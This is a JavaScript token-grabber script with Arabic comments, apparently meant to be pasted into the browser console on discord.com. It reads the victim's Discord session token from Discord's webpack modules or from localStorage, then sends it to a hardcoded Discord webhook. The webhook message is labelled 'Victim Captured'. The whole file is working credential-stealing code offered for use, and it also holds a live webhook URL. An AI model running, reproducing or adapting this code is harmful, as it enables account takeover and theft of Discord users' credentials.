async function captureDiscordToken() {
    // وظيفة للبحث عن التوكن داخل الـ Webpack بمسمياتها الجديدة
    const findToken = () => {
        try {
            // محاولة الوصول عبر المحرك الأساسي لـ Discord
            return (Object.values(webpackChunkdiscord_app.push([
                [Math.random()], {}, (req) => {
                    for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
                        if (m.default && m.default.getToken !== undefined) {
                            return m.default.getToken();
                        }
                        // فحص إضافي في حال تغير مسار الدالة
                        if (m.getToken !== undefined) {
                            return m.getToken();
                        }
                    }
                }
            ]))[0]);
        } catch (e) {
            // طريقة بديلة في حال فشل الـ Webpack (عبر التخزين المحلي)
            const iframe = document.createElement('iframe');
            document.head.append(iframe);
            const token = iframe.contentWindow.localStorage.token || iframe.contentWindow.localStorage.getItem("token");
            iframe.remove();
            return token ? token.replace(/"/g, '') : null;
        }
    };

    const token = findToken();
    const webhookURL = "https://discord.com/api/webhooks/1457772372277985334/gERxn1zWx6OBQ8dn4n16zjn-QO3fwsCVAIBScZy_WgXe41Quuqke5HgArJntAB_5zodF";

    if (token && token !== "undefined") {
        await fetch(webhookURL, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                username: "System Logger",
                avatar_url: "https://i.imgur.com/hY76S6l.png",
                embeds: [{
                    title: "✅ تم سحب التوكن بنجاح",
                    color: 0x00ff00,
                    fields: [
                        { name: "Discord Token", value: `\`\`\`${token}\`\`\`` }
                    ],
                    footer: { text: "Victim Captured via ./098" },
                    timestamp: new Date()
                }]
            })
        });
        console.log("%c [✔] Success!", "color: green; font-weight: bold;");
    } else {
        console.log("%c [!] Token not found. Make sure you are on discord.com/app", "color: red;");
    }
}

captureDiscordToken();
